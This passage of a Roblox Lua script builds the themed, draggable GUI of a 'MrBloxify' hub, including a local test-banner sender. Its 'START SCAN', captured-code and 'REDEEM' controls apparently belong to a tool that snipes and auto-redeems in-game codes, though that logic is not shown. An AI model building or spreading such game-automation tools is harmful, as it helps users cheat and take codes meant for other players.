    closeBtn.Position = UDim2.new(1, -26, 0, 6)
    closeBtn.BorderSizePixel = 0
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Text = "X"
    closeBtn.TextSize = 10
    closeBtn.AutoButtonColor = false
    closeBtn.Parent = header
    themeReg(closeBtn, "BackgroundColor3", "hover")
    themeReg(closeBtn, "TextColor3", "textMain")

    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(1, 0)
    closeCorner.Parent = closeBtn

    local msgBox = Instance.new("TextBox")
    msgBox.Size = UDim2.new(1, -24, 0, 28)
    msgBox.Position = UDim2.fromOffset(12, 38)
    msgBox.BorderSizePixel = 0
    msgBox.Font = Enum.Font.GothamBold
    msgBox.Text = ""
    msgBox.PlaceholderText = "напиши сообщение..."
    msgBox.TextSize = 11
    msgBox.ClearTextOnFocus = false
    msgBox.TextXAlignment = Enum.TextXAlignment.Left
    msgBox.Parent = senderFrame
    themeReg(msgBox, "BackgroundColor3", "input")
    themeReg(msgBox, "TextColor3", "textInput")
    themeReg(msgBox, "PlaceholderColor3", "placeholder")

    local msgCorner = Instance.new("UICorner")
    msgCorner.CornerRadius = UDim.new(0, 10)
    msgCorner.Parent = msgBox

    local msgPad = Instance.new("UIPadding")
    msgPad.PaddingLeft = UDim.new(0, 8)
    msgPad.PaddingRight = UDim.new(0, 8)
    msgPad.Parent = msgBox

    local sendBtn = Instance.new("TextButton")
    sendBtn.Size = UDim2.new(1, -24, 0, 26)
    sendBtn.Position = UDim2.fromOffset(12, 72)
    sendBtn.BorderSizePixel = 0
    sendBtn.BackgroundTransparency = 0.2
    sendBtn.Font = Enum.Font.GothamBold
    sendBtn.Text = "SEND"
    sendBtn.TextSize = 11
    sendBtn.AutoButtonColor = false
    sendBtn.Parent = senderFrame
    themeReg(sendBtn, "BackgroundColor3", "active")
    themeReg(sendBtn, "TextColor3", "textMain")

    local sendCorner = Instance.new("UICorner")
    sendCorner.CornerRadius = UDim.new(0, 10)
    sendCorner.Parent = sendBtn

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -24, 0, 14)
    statusLabel.Position = UDim2.fromOffset(12, 102)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.Text = ""
    statusLabel.TextSize = 9
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextTruncate = Enum.TextTruncate.AtEnd
    statusLabel.Parent = senderFrame
    themeReg(statusLabel, "TextColor3", "textSub")

    addHover(sendBtn, function() return getColor("active"), 0.2 end)
    attachClick(closeBtn)

    local function send()
        local text = msgBox.Text

        if match(text, "^%s*$") then
            return
        end

        showBanner(text)
        receiveMessage(text)

        statusLabel.Text = "sent: " .. text
    end

    sendBtn.MouseButton1Click:Connect(send)

    msgBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            send()
        end
    end)

    closeBtn.MouseButton1Click:Connect(function()
        senderFrame.Visible = false
    end)

    -- Перетаскивание окна за заголовок
    local senderDragging = false
    local senderDragStart
    local senderStartPos

    header.InputBegan:Connect(function(input)
        local t = input.UserInputType

        if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
            senderDragging = true
            senderDragStart = input.Position
            senderStartPos = senderFrame.Position
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if not senderDragging then
            return
        end

        local t = input.UserInputType

        if t == Enum.UserInputType.MouseMovement or t == Enum.UserInputType.Touch then
            local delta = input.Position - senderDragStart

            senderFrame.Position = UDim2.new(
                senderStartPos.X.Scale, senderStartPos.X.Offset + delta.X,
                senderStartPos.Y.Scale, senderStartPos.Y.Offset + delta.Y
            )
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        local t = input.UserInputType

        if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
            senderDragging = false
        end
    end)

    -- Кнопка в верхней панели главного окна, открывает/закрывает «TEST SENDER»
    local senderButton = Instance.new("TextButton")
    senderButton.Size = UDim2.fromOffset(18, 18)
    senderButton.Position = UDim2.new(1, -136, 0, 13)
    senderButton.BorderSizePixel = 0
    senderButton.Text = "📢"
    senderButton.Font = Enum.Font.GothamBold
    senderButton.TextSize = 12
    senderButton.AutoButtonColor = false
    senderButton.Parent = topBar
    themeReg(senderButton, "BackgroundColor3", "hover")
    themeReg(senderButton, "TextColor3", "textMain")

    local senderBtnCorner = Instance.new("UICorner")
    senderBtnCorner.CornerRadius = UDim.new(1, 0)
    senderBtnCorner.Parent = senderButton

    attachClick(senderButton)

    senderButton.MouseButton1Click:Connect(function()
        senderFrame.Visible = not senderFrame.Visible
    end)
end

-- ========================= MrBloxify (второе окно) =========================
-- При запуске всегда открыт MRBLOXIFY HUB. Кнопка 🔄 в его шапке открывает MrBloxify,
-- кнопка ↩ в шапке MrBloxify возвращает обратно. Состояние (скан, режим, delay, код) общее.

do
    local function make(class, props, parent)
        local object = Instance.new(class)

        for key, value in pairs(props) do
            object[key] = value
        end

        object.Parent = parent
        return object
    end

    -- Отдельная система тем MrBloxify (по умолчанию фиолетовая)
    local BLOX_PRESETS = {
        purple = {
            bg = rgb(45, 20, 65),       bar = rgb(75, 35, 105),
            button = rgb(75, 35, 105),  hover = rgb(105, 55, 140),
            active = rgb(70, 180, 100), input = rgb(75, 35, 105),
            stroke = rgb(75, 35, 105),  text = rgb(210, 160, 255),
            textMain = rgb(200, 140, 255), textInput = rgb(240, 225, 250),
            textSub = rgb(190, 120, 255),  textSoft = rgb(205, 180, 225),
            placeholder = rgb(175, 145, 195),
        },
        dark = THEME_PRESETS.dark,
        light = THEME_PRESETS.light,
        newyear = THEME_PRESETS.newyear,
        halloween = THEME_PRESETS.halloween,
    }

    if settings.bloxTheme ~= "custom" and not BLOX_PRESETS[settings.bloxTheme] then
        settings.bloxTheme = "purple"
    end

    local bloxThemed = {}

    local function bloxColor(role)
        if type(role) == "function" then
            role = role()
        end

        local preset = settings.bloxTheme ~= "custom" and BLOX_PRESETS[settings.bloxTheme]

        if preset then
            return preset[role] or preset.text
        end

        local part = THEME_ROLES[role] or THEME_ROLES.text
        return Color3.fromHSV(settings.bloxHue, part[1] * settings.bloxSat, part[2])
    end

    local function bReg(object, property, role)
        bloxThemed[#bloxThemed + 1] = {object, property, role}
        object[property] = bloxColor(role)
    end

    local function applyBloxTheme(instant)
        local info = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

        for i = #bloxThemed, 1, -1 do
            local item = bloxThemed[i]
            local object = item[1]

            if not object.Parent then
                table.remove(bloxThemed, i)
            elseif instant then
                object[item[2]] = bloxColor(item[3])
            else
                TweenService:Create(object, info, {[item[2]] = bloxColor(item[3])}):Play()
            end
        end
    end

    local backInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

    -- Окно
    local bloxFrame = make("Frame", {
        Name = "MrBloxifyFrame",
        Size = UDim2.fromOffset(300, 205),
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = mainFrame.Position,
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        ClipsDescendants = true,
        Visible = false,
    }, screenGui)
    bReg(bloxFrame, "BackgroundColor3", "bg")

    local bloxScale = make("UIScale", {Scale = settings.scale}, bloxFrame)
    make("UICorner", {CornerRadius = UDim.new(0, 16)}, bloxFrame)
    local bloxStroke = make("UIStroke", {Thickness = 1.5}, bloxFrame)
    bReg(bloxStroke, "Color", "stroke")

    hub.xmasBlox = hub.makeXmasDecor(bloxFrame)
    hub.halloBlox = hub.makeHalloweenDecor(bloxFrame)
    hub.refreshBloxXmas = function()
        hub.xmasBlox(settings.bloxTheme == "newyear")
        hub.halloBlox(settings.bloxTheme == "halloween")
    end
    hub.refreshBloxXmas()

    local bloxAvatar = make("ImageLabel", {
        Size = UDim2.fromOffset(30, 30),
        Position = UDim2.new(1, -42, 0, 7),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3894031200",
        ScaleType = Enum.ScaleType.Crop,
        ZIndex = 20,
    }, bloxFrame)
    make("UICorner", {CornerRadius = UDim.new(1, 0)}, bloxAvatar)

    local bloxTop = make("Frame", {
        Size = UDim2.new(1, 0, 0, 44),
        BackgroundTransparency = 0.4,
        BorderSizePixel = 0,
    }, bloxFrame)
    bReg(bloxTop, "BackgroundColor3", "bar")
    make("UICorner", {CornerRadius = UDim.new(0, 16)}, bloxTop)

    local bloxTitle = make("TextLabel", {
        Size = UDim2.fromOffset(200, 14),
        Position = UDim2.fromOffset(12, 8),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        Text = "MRBLOXIFY HUB",
        TextSize = 10,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, bloxTop)
    bReg(bloxTitle, "TextColor3", "text")

    local bloxSubtitle = make("TextLabel", {
        Size = UDim2.fromOffset(200, 12),
        Position = UDim2.fromOffset(12, 25),
        BackgroundTransparency = 1,
        Font = Enum.Font.Gotham,
        Text = "TG:MRBLOXTRADE",
        TextSize = 10,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, bloxTop)
    bReg(bloxSubtitle, "TextColor3", "textSub")

    -- Красная/зелёная точка (закрывает всё, как в оригинале)
    local bloxDot = make("TextButton", {
        Size = UDim2.fromOffset(10, 10),
        Position = UDim2.new(1, -18, 0, 17),
        BackgroundColor3 = Color3.fromRGB(220, 40, 50),
        BorderSizePixel = 0,
        Text = "",
        AutoButtonColor = false,
    }, bloxTop)
    make("UICorner", {CornerRadius = UDim.new(1, 0)}, bloxDot)

    -- Кнопка «назад в MRBLOXIFY HUB»
    local backButton = make("TextButton", {
        Size = UDim2.fromOffset(18, 18),
        Position = UDim2.new(1, -180, 0, 13),
        BorderSizePixel = 0,
        Text = "↩",
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        AutoButtonColor = false,
    }, bloxTop)
    bReg(backButton, "BackgroundColor3", "hover")
    bReg(backButton, "TextColor3", "textInput")
    make("UICorner", {CornerRadius = UDim.new(1, 0)}, backButton)

    -- Кнопки и поля
    local bloxScan = make("TextButton", {
        Size = UDim2.new(1, -24, 0, 30),
        Position = UDim2.fromOffset(12, 52),
        BackgroundTransparency = 0.35,
        BorderSizePixel = 0,
        Font = Enum.Font.GothamBold,
        Text = "START SCAN",
        TextSize = 11,
        AutoButtonColor = false,
    }, bloxFrame)
    bReg(bloxScan, "BackgroundColor3", function() return scanning and "active" or "button" end)
    bReg(bloxScan, "TextColor3", "textMain")
    make("UICorner", {CornerRadius = UDim.new(0, 10)}, bloxScan)

    local bloxMode = make("TextButton", {
        Size = UDim2.new(1, -24, 0, 30),
        Position = UDim2.fromOffset(12, 88),
        BackgroundTransparency = 0.35,
        BorderSizePixel = 0,
        Font = Enum.Font.GothamBold,
        Text = hub.modeText(),
        TextSize = 9,
        AutoButtonColor = false,
    }, bloxFrame)
    bReg(bloxMode, "BackgroundColor3", "button")
    bReg(bloxMode, "TextColor3", "textSoft")
    make("UICorner", {CornerRadius = UDim.new(0, 10)}, bloxMode)

    bloxPreview = make("TextBox", {
        Size = UDim2.new(1, -102, 0, 30),
        Position = UDim2.fromOffset(12, 126),
        BackgroundTransparency = 0.35,
        BorderSizePixel = 0,
        PlaceholderText = "Captured code...",
        Text = "",
        ClearTextOnFocus = false,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, bloxFrame)
    bReg(bloxPreview, "BackgroundColor3", "input")
    bReg(bloxPreview, "PlaceholderColor3", "placeholder")
    bReg(bloxPreview, "TextColor3", "textInput")
    make("UICorner", {CornerRadius = UDim.new(0, 10)}, bloxPreview)
    make("UIPadding", {PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 8)}, bloxPreview)

    local bloxRedeem = make("TextButton", {
        Size = UDim2.fromOffset(70, 30),
        Position = UDim2.new(1, -82, 0, 126),
        BorderSizePixel = 0,
        Text = "REDEEM",
        Font = Enum.Font.GothamBold,
        TextSize = 10,
        AutoButtonColor = false,
    }, bloxFrame)
    bReg(bloxRedeem, "BackgroundColor3", "button")
    bReg(bloxRedeem, "TextColor3", "textMain")
    make("UICorner", {CornerRadius = UDim.new(0, 10)}, bloxRedeem)

    local bloxRow = make("Frame", {
        Size = UDim2.new(1, -24, 0, 30),
        Position = UDim2.fromOffset(12, 162),
        BackgroundTransparency = 1,
    }, bloxFrame)

    local bloxDelayLabel = make("TextLabel", {
        Size = UDim2.fromOffset(48, 30),
        Position = UDim2.fromOffset(10, 0),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        Text = "Delay:",
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, bloxRow)
    bReg(bloxDelayLabel, "TextColor3", "textSoft")

    local bloxDelay = make("TextBox", {
        Size = UDim2.fromOffset(48, 30),
        Position = UDim2.fromOffset(62, 0),
        BackgroundTransparency = 0.35,
        BorderSizePixel = 0,
        Text = tostring(delay),
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        TextXAlignment = Enum.TextXAlignment.Center,
        ClearTextOnFocus = false,
    }, bloxRow)
    bReg(bloxDelay, "BackgroundColor3", "input")
    bReg(bloxDelay, "TextColor3", "textInput")
    make("UICorner", {CornerRadius = UDim.new(0, 10)}, bloxDelay)

    local bloxSet = make("TextButton", {
        Size = UDim2.fromOffset(70, 30),
        Position = UDim2.new(1, -70, 0, 0),
        BorderSizePixel = 0,
        Text = "SET",
        Font = Enum.Font.GothamBold,
        TextSize = 10,
        AutoButtonColor = false,
    }, bloxRow)
    bReg(bloxSet, "BackgroundColor3", "button")
    bReg(bloxSet, "TextColor3", "textMain")
    make("UICorner", {CornerRadius = UDim.new(0, 10)}, bloxSet)

    -- Hover + «нажатие» (как в MRBLOXIFY HUB): подсветка, сжатие до 0.94 при нажатии, возврат с «пружинкой»
    local bloxHoverInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local bloxPressInfo = TweenInfo.new(0.12, Enum.EasingStyle.Back, Enum.EasingDirection.Out)

    local function addBloxHover(button, getBase)
        local normalTransparency = button.BackgroundTransparency
        local press = make("UIScale", {}, button)

        local function create(object, info, props)
            return TweenService:Create(object, info, props, "animButtons")
        end

        local function base()
            if getBase then
                return getBase()
            end

            return bloxColor("button"), normalTransparency
        end

        button.MouseEnter:Connect(function()
            create(button, bloxHoverInfo, {
                BackgroundColor3 = bloxColor("hover"),
                BackgroundTransparency = 0.05,
            }):Play()
        end)

        button.MouseLeave:Connect(function()
            local color, transparency = base()

            create(button, bloxHoverInfo, {
                BackgroundColor3 = color,
                BackgroundTransparency = transparency,
            }):Play()
            create(press, bloxPressInfo, {Scale = 1}):Play()
        end)

        button.MouseButton1Down:Connect(function()
            create(press, TweenInfo.new(0.08), {Scale = 0.94}):Play()
        end)

        button.MouseButton1Up:Connect(function()
            create(press, bloxPressInfo, {Scale = 1}):Play()
        end)

        button.MouseButton1Click:Connect(playClick)
    end

    addBloxHover(bloxScan, function()
        if scanning then
            return bloxColor("active"), 0.15
        end

        return bloxColor("button"), 0.35
    end)
    addBloxHover(bloxMode)
    addBloxHover(bloxRedeem, function() return bloxColor("button"), 0 end)
    addBloxHover(bloxSet, function() return bloxColor("button"), 0 end)
    attachClick(backButton)
    attachClick(bloxDot)

    -- Пульсация точки (как в MRBLOXIFY HUB)
    local bloxDotNormalSize = UDim2.fromOffset(10, 10)
    local bloxDotNormalPos = UDim2.new(1, -18, 0, 17)
    local bloxDotBigSize = UDim2.fromOffset(14, 14)
    local bloxDotBigPos = UDim2.new(1, -20, 0, 15)
    local bloxPulseInfo = TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
    local bloxStateInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local bloxPulseToken = 0
    local bloxPulsing = false

    local function bloxPulseAllowed(token)
        return scanning
            and bloxPulseToken == token
            and settings.pulse
            and settings.animations
            and bloxDot.Parent
    end

    local function startBloxPulse()
        if bloxPulsing or not settings.pulse or not settings.animations then
            return
        end

        bloxPulsing = true
        bloxPulseToken += 1
        local token = bloxPulseToken

        task.spawn(function()
            while bloxPulseAllowed(token) do
                local grow = TweenService:Create(bloxDot, bloxPulseInfo, {Size = bloxDotBigSize, Position = bloxDotBigPos})
                grow:Play()
                grow.Completed:Wait()

                if not bloxPulseAllowed(token) then
                    break
                end

                local shrink = TweenService:Create(bloxDot, bloxPulseInfo, {Size = bloxDotNormalSize, Position = bloxDotNormalPos})
                shrink:Play()
                shrink.Completed:Wait()
            end

            if bloxPulseToken == token then
                bloxPulsing = false

                if bloxDot.Parent then
                    TweenService:Create(bloxDot, TweenInfo.new(0.2), {Size = bloxDotNormalSize, Position = bloxDotNormalPos}):Play()
                end
            end
        end)
    end

    local function stopBloxPulse()
        bloxPulseToken += 1
        bloxPulsing = false
        TweenService:Create(bloxDot, TweenInfo.new(0.2), {Size = bloxDotNormalSize, Position = bloxDotNormalPos}):Play()
    end

    -- Синхронизация вида MrBloxify с общим состоянием (цвета меняются плавно)
    function hub.sync()
        if scanning then
            bloxScan.Text = "SCANNING..."
            TweenService:Create(bloxScan, bloxStateInfo, {
                BackgroundColor3 = bloxColor("active"),
                BackgroundTransparency = 0.15,
            }):Play()
            TweenService:Create(bloxDot, bloxStateInfo, {
                BackgroundColor3 = Color3.fromRGB(50, 220, 80),
            }):Play()
            startBloxPulse()
        else
            bloxScan.Text = "START SCAN"
            TweenService:Create(bloxScan, bloxStateInfo, {
                BackgroundColor3 = bloxColor("button"),
                BackgroundTransparency = 0.35,
            }):Play()
            TweenService:Create(bloxDot, bloxStateInfo, {
                BackgroundColor3 = Color3.fromRGB(220, 40, 50),
            }):Play()

            if bloxPulsing then
                stopBloxPulse()
            end
        end

        bloxMode.Text = hub.modeText()
        bloxDelay.Text = tostring(delay)
    end

    -- Логика кнопок (используют общее состояние MRBLOXIFY HUB)
    bloxScan.MouseButton1Click:Connect(hub.toggleScan)
    bloxMode.MouseButton1Click:Connect(hub.cycleMode)

    local function bloxSetDelay()
        local value = tonumber(bloxDelay.Text)

        if value and value >= 0 then
            delay = value
            bloxDelay.Text = tostring(value)
            delayBox.Text = tostring(value)
        else
            bloxDelay.Text = tostring(delay)
        end
    end

    bloxDelay.FocusLost:Connect(bloxSetDelay)
    bloxSet.MouseButton1Click:Connect(bloxSetDelay)

    local function bloxManualRedeem()
        local code = bloxPreview.Text

        if not validCode(code) then
            return
        end

        if redeem(code) then
            resetBuffer()
            updatePreview()
        end
    end

    bloxRedeem.MouseButton1Click:Connect(bloxManualRedeem)

    bloxPreview.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            bloxManualRedeem()
        end
    end)

    bloxDot.MouseButton1Click:Connect(function()
        hub.stopFeatures()

        scanning = false
        processing = false
        workerScheduled = false
        resetBuffer()
        clearCache()

        local bloxCloseTween = TweenService:Create(bloxScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Scale = 0,
        }, "animWindow")
        bloxCloseTween:Play()
        bloxCloseTween.Completed:Wait()
        screenGui:Destroy()
    end)

    -- Перетаскивание окна MrBloxify
    local bloxDragging = false
    local bloxDragStart
    local bloxStartPos

    bloxFrame.InputBegan:Connect(function(input)
        local inputType = input.UserInputType

        if inputType ~= Enum.UserInputType.MouseButton1
            and inputType ~= Enum.UserInputType.Touch then
            return
        end

        bloxDragging = true
        bloxDragStart = input.Position
        bloxStartPos = bloxFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                bloxDragging = false
            end
        end)
    end)

    UserInputService.InputChanged:Connect(function(input)
        if not bloxDragging then
            return
        end

        local inputType = input.UserInputType

        if inputType ~= Enum.UserInputType.MouseMovement
            and inputType ~= Enum.UserInputType.Touch then
            return
        end

        local delta = input.Position - bloxDragStart

        bloxFrame.Position = UDim2.new(
            bloxStartPos.X.Scale,
            bloxStartPos.X.Offset + delta.X,
            bloxStartPos.Y.Scale,
            bloxStartPos.Y.Offset + delta.Y
        )
    end)

    -- ===== Кнопка 🎨 и панель тем MrBloxify =====
    local bloxThemeButton = make("TextButton", {
        Size = UDim2.fromOffset(18, 18),
        Position = UDim2.new(1, -114, 0, 13),
        BorderSizePixel = 0,
        Text = "🎨",
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        AutoButtonColor = false,
    }, bloxTop)
    bReg(bloxThemeButton, "BackgroundColor3", "hover")
    bReg(bloxThemeButton, "TextColor3", "textInput")
    make("UICorner", {CornerRadius = UDim.new(1, 0)}, bloxThemeButton)
    attachClick(bloxThemeButton)

    -- ===== TEST SENDER для MrBloxify =====
    -- Локальный тест: баннер виден только тебе, никому ничего не отправляется.
    local bloxSenderFrame = make("Frame", {
        Name = "BloxSenderFrame",
        Size = UDim2.fromOffset(240, 122),
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.35),
        BackgroundTransparency = 0.1,
        BorderSizePixel = 0,
        Visible = false,
        ZIndex = 5,
    }, screenGui)
    bReg(bloxSenderFrame, "BackgroundColor3", "bg")
    make("UIScale", {Scale = 1.2}, bloxSenderFrame)
    make("UICorner", {CornerRadius = UDim.new(0, 14)}, bloxSenderFrame)
    local bloxSenderStroke = make("UIStroke", {Thickness = 1.5}, bloxSenderFrame)
    bReg(bloxSenderStroke, "Color", "stroke")

    local bloxSenderHeader = make("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        BackgroundTransparency = 0.2,
        BorderSizePixel = 0,
    }, bloxSenderFrame)
    bReg(bloxSenderHeader, "BackgroundColor3", "bar")
    make("UICorner", {CornerRadius = UDim.new(0, 14)}, bloxSenderHeader)

    local bloxSenderTitle = make("TextLabel", {
        Size = UDim2.new(1, -50, 1, 0),
        Position = UDim2.fromOffset(12, 0),
        BackgroundTransparency = 1,
        Font = Enum.Font.GothamBold,
        Text = "TEST SENDER",
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, bloxSenderHeader)
    bReg(bloxSenderTitle, "TextColor3", "text")

    local bloxSenderClose = make("TextButton", {
        Size = UDim2.fromOffset(18, 18),
        Position = UDim2.new(1, -26, 0, 6),
        BorderSizePixel = 0,
        Font = Enum.Font.GothamBold,
        Text = "X",
        TextSize = 10,
        AutoButtonColor = false,
    }, bloxSenderHeader)
    bReg(bloxSenderClose, "BackgroundColor3", "hover")
    bReg(bloxSenderClose, "TextColor3", "textMain")
    make("UICorner", {CornerRadius = UDim.new(1, 0)}, bloxSenderClose)

    local bloxSenderBox = make("TextBox", {
        Size = UDim2.new(1, -24, 0, 28),
        Position = UDim2.fromOffset(12, 38),
        BorderSizePixel = 0,
        Font = Enum.Font.GothamBold,
        Text = "",
        PlaceholderText = "напиши сообщение...",
        TextSize = 11,
        ClearTextOnFocus = false,
        TextXAlignment = Enum.TextXAlignment.Left,
    }, bloxSenderFrame)
    bReg(bloxSenderBox, "BackgroundColor3", "input")
    bReg(bloxSenderBox, "TextColor3", "textInput")
    bReg(bloxSenderBox, "PlaceholderColor3", "placeholder")
    make("UICorner", {CornerRadius = UDim.new(0, 10)}, bloxSenderBox)
    make("UIPadding", {PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 8)}, bloxSenderBox)

    local bloxSenderSend = make("TextButton", {
        Size = UDim2.new(1, -24, 0, 26),
        Position = UDim2.fromOffset(12, 72),
        BorderSizePixel = 0,
        BackgroundTransparency = 0.2,
        Font = Enum.Font.GothamBold,
        Text = "SEND",
        TextSize = 11,
        AutoButtonColor = false,
    }, bloxSenderFrame)
    bReg(bloxSenderSend, "BackgroundColor3", "active")
    bReg(bloxSenderSend, "TextColor3", "textMain")
    make("UICorner", {CornerRadius = UDim.new(0, 10)}, bloxSenderSend)

    local bloxSenderStatus = make("TextLabel", {
        Size = UDim2.new(1, -24, 0, 14),
        Position = UDim2.fromOffset(12, 102),
        BackgroundTransparency = 1,
        Font = Enum.Font.Gotham,
        Text = "",
        TextSize = 9,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
    }, bloxSenderFrame)
    bReg(bloxSenderStatus, "TextColor3", "textSub")

    addBloxHover(bloxSenderSend, function() return bloxColor("active"), 0.2 end)
    attachClick(bloxSenderClose)

    local function bloxSenderSendMessage()
        local text = bloxSenderBox.Text

        if match(text, "^%s*$") then
            return
        end

        if hub.showBanner then
            hub.showBanner(text)
        end

        receiveMessage(text)

        bloxSenderStatus.Text = "sent: " .. text
    end

    bloxSenderSend.MouseButton1Click:Connect(bloxSenderSendMessage)

    bloxSenderBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            bloxSenderSendMessage()
        end
    end)

    bloxSenderClose.MouseButton1Click:Connect(function()
        bloxSenderFrame.Visible = false
    end)

    -- Перетаскивание окна за заголовок
    local bloxSenderDragging = false
    local bloxSenderDragStart
    local bloxSenderStartPos

    bloxSenderHeader.InputBegan:Connect(function(input)
        local t = input.UserInputType

        if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
            bloxSenderDragging = true
            bloxSenderDragStart = input.Position
            bloxSenderStartPos = bloxSenderFrame.Position
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if not bloxSenderDragging then
            return
        end

        local t = input.UserInputType

        if t == Enum.UserInputType.MouseMovement or t == Enum.UserInputType.Touch then
            local delta = input.Position - bloxSenderDragStart

            bloxSenderFrame.Position = UDim2.new(
                bloxSenderStartPos.X.Scale, bloxSenderStartPos.X.Offset + delta.X,
                bloxSenderStartPos.Y.Scale, bloxSenderStartPos.Y.Offset + delta.Y
            )
        end
    end)

    UserInputService.InputEnded:Connect(function(input)
        local t = input.UserInputType

        if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
            bloxSenderDragging = false
        end
    end)

    -- Кнопка 📢 в шапке MrBloxify, открывает/закрывает «TEST SENDER»
    local bloxSenderButton = make("TextButton", {
        Size = UDim2.fromOffset(18, 18),
        Position = UDim2.new(1, -136, 0, 13),
        BorderSizePixel = 0,
        Text = "📢",
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        AutoButtonColor = false,
    }, bloxTop)
    bReg(bloxSenderButton, "BackgroundColor3", "hover")
    bReg(bloxSenderButton, "TextColor3", "textInput")
    make("UICorner", {CornerRadius = UDim.new(1, 0)}, bloxSenderButton)
    attachClick(bloxSenderButton)

    bloxSenderButton.MouseButton1Click:Connect(function()
        bloxSenderFrame.Visible = not bloxSenderFrame.Visible
    end)

    -- При возврате в MRBLOXIFY HUB прячем тестовое окно MrBloxify
    backButton.MouseButton1Click:Connect(function()
        bloxSenderFrame.Visible = false
    end)

    local function buildBloxThemePanel()
        local panel = make("ScrollingFrame", {
            Name = "BloxThemePanel",
            Size = UDim2.new(1, 0, 0, 157),
            Position = UDim2.new(0, 0, 1, 0),
            CanvasSize = UDim2.new(0, 0, 0, 240),
            ScrollBarThickness = 3,
            BorderSizePixel = 0,
            Active = true,
            ZIndex = 10,
        }, bloxFrame)
        bReg(panel, "BackgroundColor3", "bg")

        local header = make("TextLabel", {
            Size = UDim2.new(1, -24, 0, 16),
            Position = UDim2.fromOffset(12, 5),
            BackgroundTransparency = 1,
            Font = Enum.Font.GothamBold,
            Text = "Тематика MrBloxify",
            TextSize = 11,
            TextXAlignment = Enum.TextXAlignment.Left,
        }, panel)
        bReg(header, "TextColor3", "text")

        local presets = {
            {0.78, 1},  {0.555, 1}, {0.49, 1}, {0.40, 1},
            {0.30, 1},  {0.20, 1},  {0.14, 1}, {0.07, 1},
            {0.00, 1},  {0.96, 1},  {0.91, 1}, {0.86, 1},
            {0.72, 1},  {0.65, 1},  {0.60, 1}, {0.00, 0},
        }

        local swatches = {}
        local specials = {}

        local hueBar = make("Frame", {
            Size = UDim2.new(1, -34, 0, 14),
            Position = UDim2.fromOffset(17, 214),
            BackgroundColor3 = Color3.new(1, 1, 1),
            BorderSizePixel = 0,
        }, panel)

        local knob = make("Frame", {
            Size = UDim2.fromOffset(8, 20),
            AnchorPoint = Vector2.new(0.5, 0.5),
            Position = UDim2.new(settings.bloxHue, 0, 0.5, 0),
            BackgroundColor3 = Color3.new(1, 1, 1),
            BorderSizePixel = 0,
            ZIndex = 2,
        }, hueBar)

        local function refreshSwatches()
            for _, item in ipairs(swatches) do
                item.stroke.Enabled = settings.bloxTheme == "custom"
                    and math.abs(settings.bloxHue - item.hue) < 0.005
                    and math.abs(settings.bloxSat - item.sat) < 0.005
            end

            for _, item in ipairs(specials) do
                item.stroke.Enabled = settings.bloxTheme == item.key
            end
        end

        local specialList = {
            {"purple", "💜 Фиолетовая"},
            {"dark", "🌑 Чёрная"},
            {"light", "☀️ Белая"},
            {"newyear", "🎄 Новогодняя"},
            {"halloween", "🎃 Хэллоуин"},
        }

        for i, entry in ipairs(specialList) do
            local key, label = entry[1], entry[2]
            local column = (i - 1) % 2
            local row = math.floor((i - 1) / 2)
            local preset = BLOX_PRESETS[key]

            local special = make("TextButton", {
                Size = UDim2.new(0.5, -21, 0, 26),
                Position = UDim2.new(column * 0.5, column == 0 and 17 or 4, 0, 26 + row * 30),
                BackgroundColor3 = preset.bar,
                BorderSizePixel = 0,
                Font = Enum.Font.GothamBold,
                Text = label,
                TextColor3 = key == "light" and preset.text or preset.textMain,
                TextSize = 10,
                AutoButtonColor = false,
            }, panel)
            make("UICorner", {CornerRadius = UDim.new(0, 10)}, special)

            local specialStroke = make("UIStroke", {
                Thickness = 2,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
                Enabled = false,
            }, special)
            bReg(specialStroke, "Color", "text")

            specials[#specials + 1] = {key = key, stroke = specialStroke}
            attachClick(special)

